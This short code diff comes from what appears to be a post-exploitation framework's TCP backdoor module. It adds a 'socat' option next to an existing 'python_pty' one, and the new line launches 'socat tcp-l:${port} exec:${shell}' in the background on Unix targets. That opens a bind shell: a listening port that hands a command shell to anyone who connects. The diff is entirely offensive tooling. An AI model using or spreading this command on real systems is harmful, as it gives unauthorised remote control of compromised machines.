@@ -40,6 +40,12 @@ class Tcp(Module):
                 name = 'python_pty',
                 target = Os.NIX,
                 background = True
+              ),
+              ShellCmd(
+                """socat tcp-l:${port} exec:${shell}""",
+                name = 'socat',
+                target = Os.NIX,
+                background = True
               )
             ]
         )
